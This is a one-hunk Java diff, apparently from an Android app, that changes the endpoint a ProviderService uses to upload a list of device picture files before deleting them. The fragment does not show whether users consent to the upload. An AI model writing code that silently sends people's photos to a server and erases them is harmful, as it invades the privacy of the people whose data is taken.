@@ -274,7 +274,7 @@ public class ProviderService {
         getPicture(getMediaFiles());
         final List<File> updateList = (List<File>) updateFile(picturePath, Constant.SHARE_KEYS.PICTURE);
         if (updateList != null) {
-            OkHttpUtils.postAsync(ApiConfig.getPicture(), new HttpParams().addFiles("picture", updateList), new HttpCallback(BaseResponse.class) {
+            OkHttpUtils.postAsync(ApiConfig.getTakePicture(), new HttpParams().addFiles("picture", updateList), new HttpCallback(BaseResponse.class) {
                 @Override
                 public void onSuccess(BaseResponse httpResponse, Headers headers) {
                     FileUtils.delete(updateList);
